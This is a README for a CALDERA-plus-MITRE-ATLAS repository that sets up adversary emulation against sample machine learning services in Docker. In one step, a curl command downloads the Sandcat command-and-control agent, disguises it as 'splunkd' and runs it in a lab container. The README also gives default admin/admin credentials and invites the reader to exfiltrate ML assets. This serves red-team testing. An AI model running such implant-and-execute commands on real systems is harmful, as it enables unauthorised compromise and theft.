## CALDERA + ATLAS

This repository brings together several projects to enable adversary emulation and red-teaming of machine learning (ML) systems. It configures the MITRE CALDERA&trade; docker image with MITRE ATLAS&trade; plugins and provides sample ML services and environments for testing.

[CALDERA](https://caldera.mitre.org/) is a cyber security platform designed to easily automate adversary emulation, assist manual red-teams, and automate incident response.

[MITRE ATLAS](https://atlas.mitre.org/) (The Adversarial Threat Landscape for AI Systems) is a knowledge base of adversary tactics, techniques, and procedures targeting ML systems.

Included ATLAS CALDERA Plugins:
- [Almanac](https://github.com/mitre-atlas/almanac): Adds the [ATLAS Navigator](https://mitre-atlas.github.io/atlas-navigator/) to CALDERA
- [Arsenal](https://github.com/mitre-atlas/arsenal): Implements ATLAS techniques as CALDERA Abilities and provides sample CALDERA Adversaries that target ML systems

[ML-Vulhub](https://github.com/mitre-atlas/ml-vulhub) is a collection of of scripts for intantiating ML-related services and modeling ML environments


### Basic Setup:

1. Build the CALDERA docker image:
```bash
docker-compose build
```

2. Run the CALDERA docker image with ATLAS plugins plugins (`almanac` and `arsenal`):
```bash
docker-compose up -d
```

3. Access the CALDERA interface at [localhost](https://localhost:8888).

The default username/password is `admin`/`admin`

4. Use CALDERA with the Almanac and Arsenal plugins.

If you aren't already familiar with CALDERA, start with the [CALDERA documentation](https://caldera.readthedocs.io/en/latest/Getting-started.html).

The Almanac and Arsenal plugins can be accessed under the Plugins heading on the left-hand navigation menu.

Arsenal populates CALDERA with new Abilities that implement ATLAS techniques. It also adds new Adversary Profiles that use ATLAS techniques target ML services and resources. More information is available in the [Arsenal documentation](https://github.com/mitre-atlas/arsenal).

5. Cleanup:
```bash
docker-compose down
```

### Example Usage with ML VulHub

[ML-Vulhub](https://github.com/mitre-atlas/ml-vulhub) is a companion project that provides sample ML-enabled services and environments.
This example models a compromised ML developer machine that has access to a private s3 bucket containing a model zoo and an internal ML model served with torchserve.

1. Startup CALDERA if it's not already running.
```bash
docker-compose up -d
```

2. Start a test environment from an example on ML VulHub.
```bash
cd ml-vulhub/envs/example-00-ml-dev

# perform build and initialization steps
docker-compose build
./init.sh

docker-compose up -d
```

3. Launch a Sandcat agent on the mldev container:
```bash
docker-compose exec mldev bash -c 'server=http://host.docker.internal:8888; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download -o splunkd; chmod u+x splunkd; ./splunkd -server $server -group red -v'
```

4. Use the Abilities and Adversary Profiles provided by Arsenal to run an Operation targeting the ML services and resourcs in the sample environment.

What ML assets can you discover and exfiltrate? What ML services can you discover, target, and attack?

5. Cleanup:
Run `docker-compose down` from both the `caldera-atlas` and `ml-vulhub/envs/example-00-ml-dev` directories.
